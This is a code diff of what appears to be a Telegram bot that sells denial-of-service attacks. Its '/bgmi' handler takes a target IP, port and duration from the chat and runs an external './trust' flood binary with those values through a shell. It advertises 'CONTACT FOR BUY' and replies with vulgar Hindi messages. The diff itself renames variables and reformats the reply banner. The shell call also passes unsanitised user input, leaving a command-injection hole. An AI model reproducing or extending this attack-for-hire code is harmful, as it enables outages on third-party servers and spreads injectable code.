@@ -263,10 +263,10 @@ def handle_soul(message):
         
         command = message.text.split()
         if len(command) == 4:  
-            TRUST_IP = command[1]
-            TRUST_port = int(command[2])  
+            king = command[1]
+            TRUSTPAPA = int(command[2])  
             time = int(command[3])  
-                        if time > 181:
+            if time > 181:
                 response = " अरे क्यों माँ चुदा रहा है जब 180 से ज्यादा का अटैक नही लगता है LAST:- 180 ."
             else:
                 record_command_logs(user_id, '/soul_compiled', king, TRUSTPAPA, time)
@@ -274,33 +274,13 @@ def handle_soul(message):
                 start_attack_reply(message, king, TRUSTPAPA, time)  
                 full_command = f"./trust {king} {TRUSTPAPA} {time} 1024 900"
                 subprocess.run(full_command, shell=True)
-                response = f"""▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-                
-                 ☠️
- ᚘᚘᚘᚘᚘᚘᚘ䷁ᚘᚘᚘᚘᚘᚘᚘᚘ
-              💠ᚔ💠 𝙎𝙀𝙍𝙑𝙀𝙍 𝙍𝙀𝙏𝙐𝙍𝙉
-            💠ᚔᚔ💠
-          💠ᚔᚔᚔ💠 𝙈𝘼𝘿𝙀 𝘽𝙔 #𝙏𝙍𝙐𝙎𝙏
-        💠ᚔᚔᚔᚔ💠
-      💠ᚔᚔᚔᚔᚔ💠 𝙎𝙏𝘼𝙏𝙐𝙎:- 𝙉𝙊𝙍𝙈𝘼𝙇
-    💠ᚔᚔᚔᚔᚔᚔ💠
-  💠ᚔᚔᚔᚔᚔᚔᚔ💠𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙎𝙀𝙉𝘿
-💠ᚔᚔᚔᚔᚔᚔᚔᚔ💠
-▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-
-[𝙀𝙎𝙋 𝙃𝘼𝘾𝙆 + 𝘼𝙄𝙈𝘽𝙊𝙏]#ᴀᴠɪʟᴀʙʟᴇ
-▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬
-
-𝐶𝑂𝑁𝑇𝐴𝐶𝑇 𝐹𝑂𝑅 𝐵𝑈𝑌:- 🛸
- ᚔᚔᚔ @TRUSTVIP_MOD ᚔᚔᚔ
- """
+                response = f"▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n\💠ᚔ💠 𝙎𝙀𝙍𝙑𝙀𝙍 𝙍𝙀𝙏𝙐𝙍𝙉\n💠ᚔᚔᚔ💠 𝙈𝘼𝘿𝙀 𝘽𝙔 #𝙏𝙍𝙐𝙎𝙏\n💠ᚔᚔᚔᚔᚔ💠 𝙎𝙏𝘼𝙏𝙐𝙎:- 𝙉𝙊𝙍𝙈𝘼𝙇\n💠ᚔᚔᚔᚔᚔᚔᚔ💠𝙁𝙀𝙀𝘿𝘽𝘼𝘾𝙆 𝙎𝙀𝙉𝘿\n[𝙀𝙎𝙋 𝙃𝘼𝘾𝙆 + 𝘼𝙄𝙈𝘽𝙊𝙏]#ᴀᴠɪʟᴀʙʟᴇ\n▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬\n𝐶𝑂𝑁𝑇𝐴𝐶𝑇 𝐹𝑂𝑅 𝐵𝑈𝑌:- 🛸\n\n ᚔᚔᚔ @TRUSTVIP_MOD ᚔᚔᚔ "
         else:
             response = "✅𝗧𝗥𝗬 𝗧𝗛𝗜𝗦✅ :- /bgmi <king> <TRUSTPAPA> <time>"  
     else:
         response = " ⚠️ 𝗖𝗛𝗟 𝗕𝗢𝗢𝗦𝗗𝗜𝗞𝗘 𝗙𝗜𝗥𝗦𝗧 𝗨𝗦𝗘 𝗖𝗢𝗡𝗗𝗢𝗠  𝗕𝗨𝗬 @TRUSTVIP_MOD."
 
     bot.reply_to(message, response)
-
 
 
 @bot.message_handler(commands=['mylogs'])
